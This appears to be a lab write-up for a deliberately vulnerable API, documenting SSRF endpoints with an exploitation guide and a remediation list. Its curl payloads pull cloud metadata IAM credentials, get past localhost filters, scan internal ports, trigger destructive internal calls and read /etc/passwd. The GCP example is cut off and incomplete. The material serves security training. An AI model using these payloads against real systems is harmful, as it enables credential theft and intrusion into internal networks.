API7:2023 Server Side Request Forgery (SSRF)

HIGH SEVERITY

Description

Server Side Request Forgery occurs when an API fetches remote resources without validating the user-supplied URL. This allows attackers to make the server send requests to internal services, cloud metadata endpoints, or arbitrary external services.

Affected Files

  • app/routes/files.py - Multiple SSRF-vulnerable endpoints
  • app/utils.py - fetch_url function with no validation

Vulnerable Endpoints

Endpoint Method Parameter
/api/files/fetch POST url
/api/files/fetch-validate POST url (weak validation)
/api/files/proxy GET/POST url
/api/files/webhook POST webhook_url
/api/files/avatar POST url
/api/files/import-data POST api_url

Exploitation Guide

1. Access Internal Services

Fetch content from internal network services:

# Get auth token
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "john", "password": "password123"}' | jq -r '.token')

# Access internal API endpoints
curl -X POST http://localhost:5000/api/files/fetch \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:5000/api/admin/config"}'

# Access internal debug endpoints
curl -X POST http://localhost:5000/api/files/fetch \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5000/api/debug/env"}'

2. AWS Metadata Endpoint

In AWS environments, access instance metadata:

# AWS metadata endpoint
curl -X POST http://localhost:5000/api/files/fetch \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# Get IAM credentials
curl -X POST http://localhost:5000/api/files/fetch \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# AWS IMDSv2 (if available)
curl -X POST http://localhost:5000/api/files/fetch \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/api/token"}'

3. GCP/Azure Metadata

# Google Cloud metadata
curl -X POST http://localhost:5000/api/files/fetch \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \

4. Bypass Weak Validation

The /fetch-validate endpoint has bypassable validation:

# These are blocked:
# localhost, 127.0.0.1, 0.0.0.0

# Bypass using alternative representations:
# Decimal IP for 127.0.0.1
curl -X POST http://localhost:5000/api/files/fetch-validate \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://2130706433/"}'

# Hex IP for 127.0.0.1
curl -X POST http://localhost:5000/api/files/fetch-validate \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://0x7f000001/"}'

# IPv6 localhost
curl -X POST http://localhost:5000/api/files/fetch-validate \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://[::1]:5000/api/admin/config"}'

# Shorthand IP
curl -X POST http://localhost:5000/api/files/fetch-validate \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.1/"}'

# Domain that resolves to 127.0.0.1
curl -X POST http://localhost:5000/api/files/fetch-validate \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localtest.me/"}'

5. Port Scanning

Discover internal services by scanning ports:

# Scan common ports
for port in 22 80 443 3306 5432 6379 8080 9200; do
  result=$(curl -s -X POST http://localhost:5000/api/files/fetch \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"url\": \"http://127.0.0.1:$port/\"}" \
    --max-time 2)

  if ! echo "$result" | grep -q "Connection refused"; then
    echo "Port $port appears open"
    echo "$result" | head -c 200
  fi
done

6. Full Proxy Abuse

The proxy endpoint provides full request proxy capability:

# Use as HTTP proxy
curl -X POST http://localhost:5000/api/files/proxy \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://internal-service:8080/admin",
    "method": "POST",
    "body": {"action": "deleteAll"}
  }'

7. Webhook SSRF

Register webhook to internal service:

# Webhook tests the URL immediately
curl -X POST http://localhost:5000/api/files/webhook \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "webhook_url": "http://internal-admin:8080/api/reset-database",
    "event": "order_created"
  }'

8. File Protocol (if enabled)

# Try file protocol for local file read
curl -X POST http://localhost:5000/api/files/fetch \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "file:///etc/passwd"}'

Impact

  • Cloud Credential Theft: Access to AWS/GCP/Azure metadata credentials
  • Internal Network Access: Pivot to internal services
  • Data Exfiltration: Read internal configuration and secrets
  • Denial of Service: Attack internal services
  • Network Mapping: Discover internal infrastructure

Remediation

  1. Whitelist allowed domains/URLs
  2. Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x)
  3. Disable non-HTTP protocols (file://, ftp://, gopher://)
  4. Use a dedicated egress proxy
  5. Implement IMDSv2 in AWS (requires headers)
  6. DNS resolution validation before connecting
